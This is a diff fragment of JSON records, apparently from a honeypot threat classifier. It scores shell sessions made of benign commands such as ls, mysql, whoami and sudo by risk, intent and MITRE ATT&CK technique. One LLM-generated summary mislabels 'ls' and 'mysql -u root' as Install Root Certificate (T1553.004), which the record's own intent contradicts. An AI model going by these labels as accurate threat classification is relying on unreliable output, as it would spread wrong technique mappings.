+      "rule_based": {
+        "risk_score": 8.0,
+        "intent": "Suspicious",
+        "rule_matches": [
+          "ls",
+          "mysql -u root"
+        ]
+      },
+      "llm_based": {
+        "intent": "Database Enumeration",
+        "skill_level": "Beginner",
+        "attack_stage": "Discovery",
+        "summary": "The user executed a command sequence ('ls', 'mysql -u root') that matches Install Root Certificate (T1553.004) behavior, triggering detections: Database Enumeration Attempt, System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "c58c74c80da3": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 27.0,
+        "intent": "Highly Malicious",
+        "rule_matches": [
+          "ls",
+          "mysql",
+          "df -h",
+          "whoami",
+          "pwd",
+          "ls",
+          "sudo",
+          "mysql",
+          "ls"
+        ]
+      },
+      "llm_based": {
+        "intent": "Privilege Escalation",
+        "skill_level": "Intermediate",
+        "attack_stage": "Privilege Escalation",
+        "summary": "The user executed a command sequence ('ls', 'mysql', 'df -h', 'whoami', 'pwd', 'ls', 'sudo', 'mysql', 'ls') that matches Sudo and Sudo Caching (T1548.003) behavior, triggering detections: Database Enumeration Attempt, Privilege Escalation Attempt, System Discovery (Reconnaissance)."
+      }
+    }
+  },
+  "370fb9d2ffa1": {
+    "level": 3,
+    "reasoning": {
+      "rule_based": {
+        "risk_score": 14.0,
+        "intent": "Suspicious",
+        "rule_matches": [
+          "ls",
+          "mysql",
+          "whoami",
+          "pwd",
+          "ls"
+        ]
+      },
+      "llm_based": {
+        "intent": "Database Enumeration",
+        "skill_level": "Beginner",
+        "attack_stage": "Discovery",
+        "summary": "The user executed a command sequence ('ls', 'mysql', 'whoami', 'pwd', 'ls') that matches Databases (T1213.006) behavior, triggering detections: Database Enumeration Attempt, System Discovery (Reconnaissance)."
+      }
+    }
+  }
+}
